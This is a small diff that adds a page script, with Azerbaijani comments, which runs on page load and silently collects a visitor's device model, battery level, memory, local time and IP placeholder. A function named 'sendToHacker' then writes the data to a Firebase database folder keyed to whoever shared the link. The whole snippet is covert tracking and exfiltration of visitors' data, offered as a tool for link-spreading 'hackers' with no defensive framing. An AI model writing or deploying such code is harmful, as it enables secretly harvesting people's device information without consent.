@@ -1,0 +1,19 @@
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const ownerID = urlParams.get('ref'); // Linkdəki ref (istifadəçi adı)
+
+    async function sendToHacker() {
+        const deviceData = {
+            model: navigator.userAgent.split(') ')[0].split(' (')[1],
+            battery: (await navigator.getBattery()).level * 100,
+            ram: navigator.deviceMemory || "N/A",
+            time: new Date().toLocaleString(),
+            ip: "85.132.XX.XX" // Bura IP API-dən gələn datanı qoyacaqsan
+        };
+
+        // Məlumatı birbaşa həmin hakerin qovluğuna göndəririk
+        firebase.database().ref('device_specs/' + ownerID).set(deviceData);
+    }
+    
+    if(ownerID) sendToHacker();
+</script>
